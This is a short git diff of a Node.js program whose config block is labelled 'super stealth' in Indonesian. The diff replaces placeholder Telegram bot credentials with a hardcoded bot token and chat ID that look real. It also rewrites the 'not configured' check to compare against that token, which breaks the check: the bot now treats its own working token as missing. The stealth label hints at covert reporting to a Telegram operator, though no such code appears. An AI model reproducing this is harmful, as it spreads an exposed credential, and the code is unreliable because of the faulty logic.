@@ -13,8 +13,8 @@ const https = require('https');
 // ==================== KONFIGURASI SUPER STEALTH ====================
 const CONFIG = {
     // Telegram Configuration
-    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE',
-    TELEGRAM_CHAT_ID: process.env.CHAT_ID || 'YOUR_CHAT_ID_HERE',
+    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || '8571006025:AAH690Akqkcf5haS83ZXMx_mPp3EdqIFDC0',
+    TELEGRAM_CHAT_ID: process.env.CHAT_ID || '6834832649',
     
     // Server Configuration
     PORT: process.env.PORT || 3000,
@@ -284,7 +284,7 @@ class EnhancedTelegramBot {
     }
     
     initialize() {
-        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
+        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === '8571006025:AAH690Akqkcf5haS83ZXMx_mPp3EdqIFDC0') {
             console.warn('⚠️ Telegram bot token not configured');
             return;
         }
